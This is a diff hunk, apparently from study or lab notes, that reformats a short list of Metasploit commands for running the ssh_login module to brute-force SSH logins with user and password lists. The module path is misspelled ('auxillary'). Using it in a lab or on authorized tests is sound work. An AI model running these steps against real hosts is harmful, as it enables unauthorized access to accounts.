@@ -90,14 +90,14 @@ as the credentials
 Here are the commands for an ssh bruteforce module: 
 
 Setting parameters in Metasploit for the ssh_login auxilliary module 
-search ssh 
-use auxillary/scanner/ssh/ssh_login
-show options 
-set RHOSTS *ip address*
-set PASS_FILE *directory to passwords list*
-set USER_FILE *full path to file with users list*
-run 
-sessions -i "pick session number" 
+'search ssh 
+ use auxillary/scanner/ssh/ssh_login
+ show options 
+ set RHOSTS *ip address*
+ set PASS_FILE *directory to passwords list*
+ set USER_FILE *full path to file with users list*
+ run 
+ sessions -i "pick session number" '
 
 
 # Network Virtualization with GNS3 
